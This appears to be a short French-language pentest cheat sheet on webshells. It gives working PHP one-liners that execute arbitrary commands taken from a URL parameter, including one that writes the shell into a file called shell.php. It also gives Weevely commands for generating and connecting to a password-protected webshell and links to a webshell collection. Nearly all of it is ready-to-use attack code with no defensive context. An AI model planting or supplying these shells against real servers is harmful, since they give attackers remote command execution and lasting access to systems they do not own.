# Webshells

## PHP

```php
<?php system($_GET['cmd']); ?>
<?php echo system($_GET['cmd']); ?>     // avec echo — affiche aussi le retour
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

## Weevely

```bash
# Générer le payload
weevely generate <password> <filename>

# Se connecter
weevely <url> <password>
```

## Ressources

* [github.com/tennc/webshell](https://github.com/tennc/webshell)
